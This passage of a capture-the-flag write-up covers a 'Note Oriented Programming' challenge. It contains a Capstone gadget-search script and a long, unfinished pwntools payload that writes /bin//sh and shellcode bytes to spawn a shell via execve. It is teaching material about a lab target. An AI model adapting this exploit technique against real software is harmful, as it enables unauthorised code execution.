</span></span><span class=line><span class=cl><span class=n>notes_array</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;A&#39;</span><span class=p>,</span> <span class=s1>&#39;A#&#39;</span><span class=p>,</span> <span class=s1>&#39;B&#39;</span><span class=p>,</span> <span class=s1>&#39;C&#39;</span><span class=p>,</span> <span class=s1>&#39;C#&#39;</span><span class=p>,</span> <span class=s1>&#39;D&#39;</span><span class=p>,</span> <span class=s1>&#39;D#&#39;</span><span class=p>,</span> <span class=s1>&#39;E&#39;</span><span class=p>,</span> <span class=s1>&#39;F&#39;</span><span class=p>,</span> <span class=s1>&#39;F#&#39;</span><span class=p>,</span> <span class=s1>&#39;G&#39;</span><span class=p>,</span> <span class=s1>&#39;G#&#39;</span><span class=p>]</span>                                                      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tonote</span><span class=p>(</span><span class=n>freq</span><span class=p>):</span>                
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>log</span><span class=p>(</span><span class=nb>float</span><span class=p>(</span><span class=n>freq</span><span class=p>)</span> <span class=o>/</span> <span class=mf>27.5</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=mf>12.0</span> <span class=o>+</span> <span class=mf>0.5</span><span class=p>;</span>                 
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>v3</span><span class=p>)</span>                 
</span></span><span class=line><span class=cl>    <span class=n>note</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>notes_array</span><span class=p>[</span><span class=n>v3</span> <span class=o>%</span> <span class=mi>12</span><span class=p>],</span> <span class=p>(</span><span class=n>v3</span> <span class=o>/</span> <span class=mi>12</span><span class=p>));</span>            
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>note</span>                  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gadgets</span> <span class=o>=</span> <span class=n>defaultdict</span><span class=p>(</span><span class=nb>list</span><span class=p>)</span>      
</span></span><span class=line><span class=cl><span class=n>gadgets_reverse</span> <span class=o>=</span> <span class=n>defaultdict</span><span class=p>(</span><span class=nb>list</span><span class=p>)</span>                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>f</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>fmin</span><span class=p>,</span> <span class=n>fmax</span><span class=p>):</span>      
</span></span><span class=line><span class=cl>    <span class=n>gadgets</span><span class=p>[</span><span class=n>tonote</span><span class=p>(</span><span class=n>f</span><span class=p>)]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>f</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=n>gadgets_reverse</span><span class=p>[</span><span class=n>f</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>tonote</span><span class=p>(</span><span class=n>f</span><span class=p>))</span>                          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>md</span> <span class=o>=</span> <span class=n>Cs</span><span class=p>(</span><span class=n>CS_ARCH_X86</span><span class=p>,</span> <span class=n>CS_MODE_32</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>baseaddr</span> <span class=o>=</span> <span class=mh>0x60606000</span>            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>disasm</span><span class=p>(</span><span class=n>code</span><span class=p>,</span> <span class=n>address</span><span class=p>):</span>       
</span></span><span class=line><span class=cl>    <span class=n>instructions</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>            
</span></span><span class=line><span class=cl>    <span class=n>regex</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;ptr \[e[bcd]x&#39;</span>     
</span></span><span class=line><span class=cl>    <span class=n>size</span> <span class=o>=</span> <span class=mi>0</span>                     
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>md</span><span class=o>.</span><span class=n>disasm</span><span class=p>(</span><span class=n>code</span><span class=p>,</span> <span class=n>address</span><span class=p>):</span>                            
</span></span><span class=line><span class=cl>        <span class=n>size</span> <span class=o>+=</span> <span class=n>i</span><span class=o>.</span><span class=n>size</span>           
</span></span><span class=line><span class=cl>        <span class=n>instructions</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=si>%s</span><span class=s1> </span><span class=si>%s</span><span class=s1>; &#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>mnemonic</span><span class=p>,</span> <span class=n>i</span><span class=o>.</span><span class=n>op_str</span><span class=p>)</span>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=n>regex</span><span class=p>,</span> <span class=n>i</span><span class=o>.</span><span class=n>op_str</span><span class=p>):</span>                           
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>size</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>        
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>              
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>instructions</span>          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>instructions</span> <span class=o>=</span> <span class=n>defaultdict</span><span class=p>(</span><span class=nb>dict</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=n>itertools</span><span class=o>.</span><span class=n>combinations</span><span class=p>(</span><span class=n>gadgets</span><span class=o>.</span><span class=n>keys</span><span class=p>(),</span> <span class=mi>3</span><span class=p>):</span>               
</span></span><span class=line><span class=cl>    <span class=n>ins</span> <span class=o>=</span> <span class=n>disasm</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>baseaddr</span><span class=p>)</span>                            
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ins</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>              
</span></span><span class=line><span class=cl>        <span class=k>continue</span>                 
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=s1>&#39;</span><span class=se>\&#39;</span><span class=si>%s</span><span class=se>\&#39;</span><span class=s1>    #</span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>ins</span><span class=p>)</span>                     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=n>instructions</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=n>instructions</span><span class=p>[</span><span class=n>k</span><span class=p>]</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>                              
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s2>&#34;</span><span class=si>%s</span><span class=s2> </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>k</span><span class=p>,</span> <span class=n>l</span><span class=p>)</span>   
</span></span></code></pre></div><p>There are no <code>mov</code> nor <code>push</code> and <code>pop</code> gadgets, only a few <code>inc</code>, some <code>xor</code>, and a couple <code>and</code>.<br>Unfortunately, the only control we excert over <code>esi</code> and <code>edi</code> is via the <code>and</code> instruction, like:</p><pre tabindex=0><code>169:&#39;G6A#0&#39;    #inc edi; inc ecx; and esi, dword ptr [eax];                                                            
170:&#39;G6A#7&#39;    #inc edi; inc ecx; and esi, dword ptr [edi];   
</code></pre><p>Although we were able to write bytes into the stack, the biggest problem for us was to write the right address into the right register so to call another <code>read()</code> or an <code>execve()</code>.</p><p>Since we weren&rsquo;t provided with enough instructions to set the registers like <code>ecx</code> and <code>ebx</code>, we all agreed on the fact that our exploit had to be done in two stages and that
the first stage had to change bytes in the <code>CODE</code> section.<br>We all decided to use a mask like <code>0x6060ff0</code> to make <code>esi</code> point to our <code>CODE</code> section, and used it to xor the instruction we needed into our NOP sled. Challenging ASLR will make our exploits not 100% reliable.<br>Oh, and since we are tough guys, we went straight for an <code>execve()</code>.</p><h3 class="relative group">Three different Exploits<div id=three-different-exploits class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#three-different-exploits aria-label=Anchor>#</a></span></h3><p>At a certain point in the night we realized we could write (<code>\x00\x00</code> excluded for obviuos reasons) every byte we wanted between <code>\xff\xff</code> and <code>\x00\x00</code> in the <code>USER_INPUT</code> section.<br>That&rsquo;s when we started coming up with different ideas. We split in three and developed three different working exploits.<br>One exploit was based on the use of the stack, the other two took advantage of the <code>USER_INPUT</code> section.</p><p>In order to set eax and al to the desired values we wrote a clever solver in z3 that used values that could be found in the stack.</p><h4 class="relative group">First Exploit<div id=first-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#first-exploit aria-label=Anchor>#</a></span></h4><p>The first idea was to xor values on the stack to write the mask, <code>/bin//sh</code>, and <code>mov ebx, edi</code>. Then we would set <code>edi</code> to point to <code>/bin//sh</code> and write the byte for <code>mov ebx, edi</code> into the nop sled.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>############### IDEA ################</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Want to change part of the stack in this way</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Before</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># OOOOOOOOOOOO---- Welcome to Note Oriented Programming!! ----OOOOOOOOOOOOOOOOOOOO</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#After </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># OOOOOOOOOOOO---- Welcome to Note O\x00\x65\x60\x60ted Progra/bin//sh\x00---\x89\xfb\x90 OOOOOOOOOOOOOOOOO</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#And between 0x60606500 and esi (may ASLR be with us)</span>
</span></span><span class=line><span class=cl><span class=c1>#Set edi to point to /bin//sh</span>
</span></span><span class=line><span class=cl><span class=c1>#Change the first 4 byte of the new esi pointer into 89fb(mov ebx, edi)</span>
</span></span><span class=line><span class=cl><span class=c1>#Finally set the value of eax to 0xb and place useless instructions in order to change a part of them with the mov.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Writing /bin//sh</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x30\x00\x2b\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>43</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x1e\x00\x36\x5f</span><span class=s2>&#34;</span>  
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\x78\x00\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x2b\x00\x2b\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>25</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xaa\x00\x2b\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\xb8\x1a\x36\x5f\x3b\x02\xfe\x1d\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x36\x5f\xbf\x00\x9b\x2f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x36\x5f\xbf\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x36\x5f\xbf\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x9b\x0a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\xfb\x3b\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\x54\x47\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x30\x00\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\xd3\x54\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x2b\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x54\x01</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x10\x50\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x30\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xd3\x54\x36\x5f</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>11</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xd3\x54</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\x70\x35\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\x8c\x3f\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x9b\x2f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x30\x00\xe7\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Writing 0x60606500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x9b\x2f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xa7\x02</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xa7\x02</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x60\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x2b\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\xd3\x54\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xaa\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xf4\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xaa\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\x8c\x3f\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\xfb\x3b\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x55\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x55\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x4e\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\x8c\x3f\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xfa\x02\x10\x50\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xaa\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xa7\x02</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xaa\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xa7\x02</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x9b\x0a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xaa\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x54\x01</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x9b\x0a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xa7\x02</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x54\x01</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x54\x01</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Writing 89, bf and 90</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xbf\x00\xf4\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xf4\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xe7\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x9b\x2f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x41\x01</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xf4\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xe7\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x41\x01</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xa7\x02</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x30\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x8c\x3f\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x70\x35\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x4e\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xf4\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x4e\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x8c\x3f\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x10\x50\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xe7\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xd3\x54\x36\x5f</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x4e\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x70\x35\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x10\x50\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xd3\x54\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x4e\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Inc ESI</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xd3\x54\x36\x5f</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>41</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#AND with ESI</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3c\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x54\x47\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Clearing 4 values pointed by ESI</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x2b\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x2b\x00</span><span class=s2>&#34;</span> <span class=c1>#0</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xaa\x00</span><span class=s2>&#34;</span> <span class=c1>#2</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xa7\x02</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x55\x00</span><span class=s2>&#34;</span> <span class=c1>#1</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x55\x00</span><span class=s2>&#34;</span> <span class=c1>#1</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x4e\x05</span><span class=s2>&#34;</span> <span class=c1>#5</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x54\x01</span><span class=s2>&#34;</span> <span class=c1>#3</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x54\x01</span><span class=s2>&#34;</span> <span class=c1>#3</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x35\x15</span><span class=s2>&#34;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
